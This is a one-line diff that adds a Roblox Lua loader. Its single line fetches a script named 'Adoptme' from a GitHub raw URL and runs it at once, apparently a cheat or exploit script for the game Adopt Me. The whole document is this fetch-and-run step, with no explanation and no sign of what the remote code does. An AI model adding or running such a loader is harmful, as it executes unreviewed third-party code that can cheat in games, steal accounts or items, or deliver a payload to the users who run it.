@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LHking123456/65bv7k4w9qeh/refs/heads/main/Adoptme"))()
